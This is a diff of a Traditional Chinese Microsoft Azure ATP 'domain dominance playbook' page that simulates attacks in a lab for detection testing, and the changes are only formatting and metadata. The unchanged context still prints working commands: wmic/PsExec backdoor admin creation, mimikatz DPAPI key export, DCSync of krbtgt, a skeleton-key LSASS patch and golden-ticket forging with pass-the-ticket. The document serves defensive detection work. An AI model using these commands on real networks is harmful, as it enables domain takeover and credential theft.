@@ -2,17 +2,17 @@
 title: Azure ATP 網域支配劇本
 description: Azure ATP 網域支配腳本描述如何模擬 Azure ATP 所偵測到的網域支配攻擊
 ms.service: azure-advanced-threat-protection
-ms.topic: tutorial
+ms.topic: how-to
 author: shsagir
 ms.author: shsagir
 ms.date: 02/28/2019
 ms.reviewer: itargoet
-ms.openlocfilehash: b5903123e992f7540dd660da605a1568bf76ef91
-ms.sourcegitcommit: 63be53de5b84eabdeb8c006438dab45bd35a4ab7
+ms.openlocfilehash: 10266136b495c6fcc04355c8a16ca1c0ea00381c
+ms.sourcegitcommit: 2be59f0bd4c9fd0d3827e9312ba20aa8eb43c6b5
 ms.translationtype: HT
 ms.contentlocale: zh-TW
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "79414585"
+ms.lasthandoff: 08/27/2020
+ms.locfileid: "88953740"
 ---
 # <a name="tutorial-domain-dominance-playbook"></a>教學課程：網域支配劇本
 
@@ -57,19 +57,19 @@ ms.locfileid: "79414585"
    wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
    ```
 
-2. 現在，在使用者建立的情況下，將使用者新增至網域控制站上的「系統管理員」群組：
+1. 現在，在使用者建立的情況下，將使用者新增至網域控制站上的「系統管理員」群組：
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
    ```
 
-   ![使用遠端程式碼執行 (PsExec)，將新的使用者加入至網域控制站上的系統管理員群組](media/playbook-dominance-psexec_addtoadmins.png)
+    ![使用遠端程式碼執行 (PsExec)，將新的使用者加入至網域控制站上的系統管理員群組](media/playbook-dominance-psexec_addtoadmins.png)
 
-3. 移至 **ContosoDC** 上的 [Active Directory 使用者和電腦 (ADUC)]  ，並尋找 **InsertedUser**。 
+1. 移至 **ContosoDC** 上的 [Active Directory 使用者和電腦 (ADUC)]  ，並尋找 **InsertedUser**。 
 
-4. 以滑鼠右鍵按一下 [內容]  ，然後檢查成員資格。
+1. 以滑鼠右鍵按一下 [內容]  ，然後檢查成員資格。
 
-   ![檢視 "InsertedUser" 的內容](media/playbook-dominance-inserteduser_properties.png)
+    ![檢視 "InsertedUser" 的內容](media/playbook-dominance-inserteduser_properties.png)
 
 作為攻擊者的您已經在實驗室中使用 WMI 成功建立新的使用者。 您也已經使用 PsExec，將新的使用者加入至「系統管理員」群組。 從持續性的觀點而言，另一個合法且獨立的認證已經在網域控制站上建立。 如果已探索到並移除先前取得的認證存取權，新的認證可讓攻擊者持續存取網域控制站。
 
@@ -103,9 +103,9 @@ Windows 使用資料保護應用程式開發介面 (DPAPI) 來安全地保護瀏
    mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
    ```
 
-   ![使用 mimikatz 從 Active Directory 匯出 DPAPI 備份金鑰](media/playbook-dominance-dpapi_mimikatz.png)
+    ![使用 mimikatz 從 Active Directory 匯出 DPAPI 備份金鑰](media/playbook-dominance-dpapi_mimikatz.png)
 
-2. 請確認已匯出主要金鑰檔案。 在您執行 mimikatz.exe 所在的目錄中尋找以查看建立的 .der、.pfx、.pvk 和 .key 檔案。 從命令提示字元中複製舊的金鑰。
+1. 請確認已匯出主要金鑰檔案。 在您執行 mimikatz.exe 所在的目錄中尋找以查看建立的 .der、.pfx、.pvk 和 .key 檔案。 從命令提示字元中複製舊的金鑰。
 
 作為攻擊者的我們現在有金鑰，才能從整個樹系中的*任何*電腦解密任何使用 DPAPI 加密的檔案/敏感性資料。
 
@@ -151,15 +151,15 @@ mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\t
    xcopy mimikatz.exe \\ContosoDC\c$\temp
    ```
 
-2. 在 **mimikatz** 現在已在 DC 上發動的情況下，透過 PsExec 從遠端執行它：
+1. 在 **mimikatz** 現在已在 DC 上發動的情況下，透過 PsExec 從遠端執行它：
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
    ```
 
-3. 您已經成功修補 **ContosoDC** 上的 LSASS 處理程序。
+1. 您已經成功修補 **ContosoDC** 上的 LSASS 處理程序。
 
-   ![透過 mimikatz 的基本架構金鑰攻擊](media/playbook-dominance-skeletonkey.png)
+    ![透過 mimikatz 的基本架構金鑰攻擊](media/playbook-dominance-skeletonkey.png)
 
 ### <a name="exploiting-the-skeleton-key-patched-lsass"></a>入侵基本架構金鑰修補的 LSASS
 
@@ -202,25 +202,25 @@ Azure ATP 成功偵測到用於此使用者的可疑預先驗證加密方法。
    whoami /user
    ```
 
-   ![黃金票證使用者的 SID](media/playbook-dominance-golden_whoamisid.png)
+    ![黃金票證使用者的 SID](media/playbook-dominance-golden_whoamisid.png)
 
-2. 找出並複製以上螢幕擷取畫面中反白顯示的網域 SID。
+1. 找出並複製以上螢幕擷取畫面中反白顯示的網域 SID。
 
-3. 使用 **mimikatz** 搭配複製的網域 SID，以及遭竊的 "krbtgt" 使用者的 NTLM 雜湊來產生 TGT。 以 JeffL 身分，將下列文字插入至 cmd.exe：
+1. 使用 **mimikatz** 搭配複製的網域 SID，以及遭竊的 "krbtgt" 使用者的 NTLM 雜湊來產生 TGT。 以 JeffL 身分，將下列文字插入至 cmd.exe：
 
    ``` cmd
    mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
    ```
 
-   ![產生黃金票證](media/playbook-dominance-golden_generate.png)
+    ![產生黃金票證](media/playbook-dominance-golden_generate.png)
 
    命令的 ```/ptt``` 部分可讓我們立即將產生的票證傳遞至記憶體。
 
-4. 請確定認證位於記憶體中。  在主控台中執行 ```klist```。
+1. 請確定認證位於記憶體中。  在主控台中執行 ```klist```。
 
-   ![傳遞產生的票證後的 klist 結果](media/playbook-dominance-golden_klist.png)
+    ![傳遞產生的票證後的 klist 結果](media/playbook-dominance-golden_klist.png)
 
-5. 以攻擊者的身分，執行下列的傳遞票證命令，以對 DC 使用它：
+1. 以攻擊者的身分，執行下列的傳遞票證命令，以對 DC 使用它：
 
    ``` cmd
    dir \\ContosoDC\c$
@@ -228,7 +228,7 @@ Azure ATP 成功偵測到用於此使用者的可疑預先驗證加密方法。
 
    成功！ 您為 SamiraA 產生了**假的**黃金票證。
 
-   ![透過 mimikatz 執行黃金票證](media/playbook-dominance-golden_ptt.png)
+    ![透過 mimikatz 執行黃金票證](media/playbook-dominance-golden_ptt.png)
 
 它為什麼可行？ 黃金票證攻擊可行是因為產生的票證是使用我們先前收集到的 'KRBTGT' 金鑰正確地簽署。 此票證可讓我們以攻擊者的身分取得對 ContosoDC 的存取權，並將自己新增至任何我們想要使用的安全性群組。
 
@@ -239,7 +239,7 @@ Azure ATP 會使用多種方法偵測這種類型的可疑攻擊。 在這個確
 ![偵測到的黃金票證](media/playbook-dominance-golden_detected.png)
 
 > [!Important]
->提醒。 只要攻擊者收集到的 KRBTGT 在環境中仍然有效，使用它產生的票證也會維持有效。 在此情況下，攻擊者可達到持續性的網域支配，直到 [KRBTGT 重設兩次](https://docs.microsoft.com/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password)為止。
+>提醒。 只要攻擊者收集到的 KRBTGT 在環境中仍然有效，使用它產生的票證也會維持有效。 在此情況下，攻擊者可達到持續性的網域支配，直到 [KRBTGT 重設兩次](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password)為止。
 
 ## <a name="next-steps"></a>後續步驟
 
